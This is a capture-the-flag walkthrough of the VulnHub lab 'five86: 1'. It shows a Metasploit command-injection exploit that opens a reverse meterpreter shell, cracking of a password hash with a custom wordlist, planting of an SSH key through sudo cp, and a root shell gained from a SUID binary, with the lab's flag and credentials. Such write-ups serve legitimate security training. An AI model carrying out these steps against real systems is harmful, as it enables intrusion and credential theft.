# VulnHUb > five86: 1

**About Release**

* Name: five86: 1
* Date release: 8 Jan 2020
* Author: DCAU
* Series: five86
* Web page: http://www.five86.com/five86-1.html

**Description**

Five86-1 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

**Download**

* Five86-1.zip (Size: 865 MB)
* Download (Mirror): https://download.vulnhub.com/five86/Five86-1.zip
* Download (Torrent): https://download.vulnhub.com/five86/Five86-1.zip.torrent ([Magnet](magnet:?xt=urn:btih:C93772BAB72AD62A701598B982FE3A373F5DAF70&dn=Five86-1.zip&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

# Services Enumeration

Nmap detects 3 services:

~~~
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)
|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)
|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/ona
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

# Web enumeration

There is a `robots.txt` file that discloses a `/ona` location:

~~~
kali@kali:/data/five86_1$ curl -s http://five86.box/robots.txt
User-agent: *
Disallow: /ona
~~~

Browsing http://five86.box/ona/ and selecting "Menu > ONA > About" will reveal that the application is "OpenNetAdmin - v18.1.1".

# Exploit OpenNetAdmin ping command injection vulnerability

Let's fire up Metasploit and search for exploits:

~~~
kali@kali:/data/five86_1/files$ msfconsole -q
[*] Starting persistent handler(s)...
msf5 > search opennetadmin

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection


msf5 > use 0
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set rhost five86.box
rhost => five86.box
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set lhost 172.16.222.128
lhost => 172.16.222.128
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > show options

Module options (exploit/unix/webapp/opennetadmin_ping_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     five86.box       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /ona/login.php   yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.222.128   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > 
[*] Started reverse TCP handler on 172.16.222.128:4444 
[*] Exploiting...
[*] Sending stage (980808 bytes) to 172.16.222.151
[*] Meterpreter session 1 opened (172.16.222.128:4444 -> 172.16.222.151:44184) at 2020-10-01 16:09:16 +0200
[*] Sending stage (980808 bytes) to 172.16.222.151
[*] Meterpreter session 2 opened (172.16.222.128:4444 -> 172.16.222.151:44186) at 2020-10-01 16:09:16 +0200
~~~

The exploit succeeded. Let's connect to the session:

~~~
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 1325 created.
Channel 1 created.

[*] Command Stager progress - 100.00% done (706/706 bytes)

python -c "import pty;pty.spawn('/bin/bash')"
www-data@five86-1:/opt/ona/www$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

# Lateral move

## www-data -> douglas

Enumerating the `/var/www` directory reveals that there is a `.htpasswd` file containing douglas hashed password.

~~~
www-data@five86-1:~$ ls -la /var/www
ls -la /var/www
total 16
drwxr-xr-x  3 root root 4096 Jan  1  2020 .
drwxr-xr-x 14 root root 4096 Jan  1  2020 ..
-rw-r--r--  1 root root  202 Jan  1  2020 .htpasswd
drwxr-xr-x  3 root root 4096 Jan  1  2020 html
www-data@five86-1:~$ cat /var/www/.htpasswd
cat /var/www/.htpasswd
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1

# To make things slightly less painful (a standard dictionary will likely fail),
# use the following character set for this 10 character password: aefhrt 
~~~

We are told (see the commments at the end of the `.htpasswd` file) that the password is 10 characters long and only contains the following characters: aefhrt.

Searching for password generators based on given length and set of characters, I found [this resource](https://unix.stackexchange.com/questions/204069/all-possible-combinations-of-characters-and-numbers) which gives the below C program (I adapted it to work with our custom list of characters):

```c
#include <stdio.h>

//global variables and magic numbers are the basis of good programming
const char* charset = "aefhrt";
char buffer[50];

void permute(int level) {
  const char* charset_ptr = charset;
  if (level == -1){
    puts(buffer);
  } else {
    while(buffer[level] = *charset_ptr++) {
      permute(level - 1);
    }
  }
}

int main(int argc, char **argv)
{
  int length;
  sscanf(argv[1], "%d", &length); 

  //Must provide length (integer < sizeof(buffer)==50) as first arg;
  //It will crash and burn otherwise  

  buffer[length] = '\0';
  permute(length - 1);
  return 0;
}
```

Let's compile it and run it:

~~~
$ gcc permute.c -o permute
$ ./permute 10 > dict.txt
~~~

We now have a dictionary containing all password possibilities. Let's brute force the password with John:

~~~
kali@kali:/data/five86_1/files$ /data/src/john/run/john htpasswd --wordlist=dict.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fatherrrrr       (douglas)
1g 0:00:05:34 DONE (2020-10-01 16:52) 0.002987g/s 144484p/s 144484c/s 144484C/s arrherrrrr..tthrerrrrr
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

After a while, we eventually find valid credentials: `douglas:fatherrrrr`. Let's connect as `douglas`:

~~~
kali@kali:/data/five86_1/files$ sshpass -p "fatherrrrr" ssh douglas@five86.box
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct  1 10:55:40 2020 from 172.16.222.128
douglas@five86-1:~$ id
uid=1005(douglas) gid=1005(douglas) groups=1005(douglas)
douglas@five86-1:~$ 
~~~

## douglas -> jen

Checking douglas privileges seems to indicate we'll need to switch to `jen`. Indeed, we can execute `cp` as `jen`.

~~~
douglas@five86-1:~$ sudo -l
Matching Defaults entries for douglas on five86-1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User douglas may run the following commands on five86-1:
    (jen) NOPASSWD: /bin/cp
~~~

Let's add our own SSH public key to the authorized_keys in jen's home:

~~~
$ echo "ssh-rsa AAAAB3NzaC1yc2[***REDACTED***]T6xDO+m7pk= kali@kali" > /tmp/authorized_keys
$ sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/
~~~

We can now connect as `jen`:

~~~
kali@kali:/data/five86_1/files$ ssh jen@five86.box 
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
jen@five86-1:~$ id
uid=1003(jen) gid=1003(jen) groups=1003(jen)
~~~

## jen -> moss

Checking for files owned by `jen` reveals that there are emails:

~~~
jen@five86-1:~$ find / -type f -user jen 2>/dev/null
/var/mail/jen

[REDACTED]

~~~

Dumping the emails will reveal Moss' password:

~~~
jen@five86-1:~$ cat /var/mail/jen
From roy@five86-1 Wed Jan 01 03:17:00 2020
Return-path: <roy@five86-1>
Envelope-to: jen@five86-1
Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500
Received: from roy by five86-1 with local (Exim 4.92)
	(envelope-from <roy@five86-1>)
	id 1imZBc-0001FU-El
	for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500
To: jen@five86-1
Subject: Monday Moss
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1imZBc-0001FU-El@five86-1>
From: Roy Trenneman <roy@five86-1>
Date: Wed, 01 Jan 2020 03:17:00 -0500

Hi Jen,

As you know, I'll be on the "customer service" course on Monday due to that incident on Level 4 with the accounts people.

But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!

Moss will understand (ha ha ha ha).

Tanks,
Roy

[REDACTED]

~~~

We can now switch to moss with `moss:Fire!Fire!`.

# Privilege escalation

There is a `.games` directory in Moss' home folder, with several symbolic links and an `upyourgame` executable owned by root with the `SUID` bit set:

~~~
moss@five86-1:~$ ls -la
total 12
drwx------ 3 moss moss 4096 Jan  1  2020 .
drwxr-xr-x 7 root root 4096 Jan  1  2020 ..
lrwxrwxrwx 1 moss moss    9 Jan  1  2020 .bash_history -> /dev/null
drwx------ 2 moss moss 4096 Jan  1  2020 .games
moss@five86-1:~$ cd .games
moss@five86-1:~/.games$ ls -la
total 28
drwx------ 2 moss moss  4096 Jan  1  2020 .
drwx------ 3 moss moss  4096 Jan  1  2020 ..
lrwxrwxrwx 1 moss moss    21 Jan  1  2020 battlestar -> /usr/games/battlestar
lrwxrwxrwx 1 moss moss    14 Jan  1  2020 bcd -> /usr/games/bcd
lrwxrwxrwx 1 moss moss    21 Jan  1  2020 bombardier -> /usr/games/bombardier
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 empire -> /usr/games/empire
lrwxrwxrwx 1 moss moss    20 Jan  1  2020 freesweep -> /usr/games/freesweep
lrwxrwxrwx 1 moss moss    15 Jan  1  2020 hunt -> /usr/games/hunt
lrwxrwxrwx 1 moss moss    20 Jan  1  2020 ninvaders -> /usr/games/ninvaders
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 nsnake -> /usr/games/nsnake
lrwxrwxrwx 1 moss moss    25 Jan  1  2020 pacman4console -> /usr/games/pacman4console
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 petris -> /usr/games/petris
lrwxrwxrwx 1 moss moss    16 Jan  1  2020 snake -> /usr/games/snake
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 sudoku -> /usr/games/sudoku
-rwsr-xr-x 1 root root 16824 Jan  1  2020 upyourgame
lrwxrwxrwx 1 moss moss    16 Jan  1  2020 worms -> /usr/games/worms
~~~

The program seems to reference `/bin/sh` according to `strings`:

~~~
moss@five86-1:~/.games$ strings upyourgame 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
printf
system
__cxa_finalize
__libc_start_main
GLIBC_2.7
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Would you like to play a game? 
Could you please repeat that? 
Nope, you'll need to enter that again. 
You entered: No.  Is this correct? 
We appear to have a problem?  Do we have a problem? 
Made in Britain.
/bin/sh <------------------------- interesting!

[REDACTED]

~~~

Simply running the program and answering the questions will end up with a root shell:

~~~
moss@five86-1:~/.games$ ./upyourgame 
Would you like to play a game? yes

Could you please repeat that? yes

Nope, you'll need to enter that again. yes

You entered: No.  Is this correct? yes

We appear to have a problem?  Do we have a problem? yes

Made in Britain.
# id
uid=0(root) gid=1001(moss) groups=1001(moss)
~~~

# Root flag

Let's get the root flag:

~~~
# cd /root
# ls -la
total 24
drwx------  3 root root 4096 Jan  1  2020 .
drwxr-xr-x 18 root root 4096 Dec 31  2019 ..
lrwxrwxrwx  1 root root    9 Dec 31  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rwx------  1 root root   33 Jan  1  2020 flag.txt
drwxr-xr-x  3 root root 4096 Jan  1  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
# cat flag.txt	
8f3b38dd95eccf600593da4522251746
~~~
